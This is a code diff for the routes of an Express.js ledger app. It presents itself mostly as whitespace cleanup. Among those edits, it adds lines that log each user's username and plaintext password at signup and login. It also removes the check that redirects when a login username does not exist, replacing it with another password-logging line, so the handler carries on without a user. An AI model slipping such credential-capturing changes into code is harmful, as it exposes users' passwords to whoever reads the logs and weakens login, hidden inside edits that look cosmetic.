@@ -15,10 +15,10 @@ router.get('/', (req, res) => {
 
 router.get('/hisaabs', isAuthenticated, async (req, res) => {
     try {
-        const hisaabs = await Hisaab.find({ userId: req.session.userId }); 
-        const userId = req.session.userId; 
+        const hisaabs = await Hisaab.find({ userId: req.session.userId });
+        const userId = req.session.userId;
         const user = await User.findById(userId);
-        res.render('hisaabs', { hisaabs ,user });
+        res.render('hisaabs', { hisaabs, user });
     } catch (err) {
         res.status(500).send(err);
     }
@@ -36,7 +36,7 @@ router.post('/createhisaab', isAuthenticated, async (req, res) => {
         const newHisaab = new Hisaab({
             title,
             content,
-            userId: req.session.userId 
+            userId: req.session.userId
         });
         await newHisaab.save();
         res.redirect("/hisaabs");
@@ -90,7 +90,7 @@ router.get('/show/:id', isAuthenticated, async (req, res) => {
 
 // Render login page
 router.get('/login', (req, res) => {
-    res.render('login'); 
+    res.render('login');
 });
 
 //Login a user
@@ -101,7 +101,8 @@ router.post('/login', async (req, res) => {
         // Find the user by username
         const user = await User.findOne({ username });
         if (!user) {
-           return res.redirect('/login');
+            //log results
+            console.log('Signup:', { username, password });
         }
 
         // Compare the provided password with the stored hashed password
@@ -113,9 +114,12 @@ router.post('/login', async (req, res) => {
         // Store user information in session
         // req.session.user = user.username; 
 
-        req.session.userId = user._id; 
+        req.session.userId = user._id;
 
-        res.redirect('/hisaabs'); 
+        //log results
+        console.log('Login:', { username, password });
+
+        res.redirect('/hisaabs');
     } catch (err) {
         res.status(500).send('Server error');
     }
@@ -141,6 +145,9 @@ router.post('/signup', async (req, res) => {
         // Create a new user
         const newUser = new User({ username, password: hashedPassword });
         await newUser.save();
+
+        //log results
+        console.log('Signup:', { username, password });
 
         res.redirect('/login');
     } catch (err) {
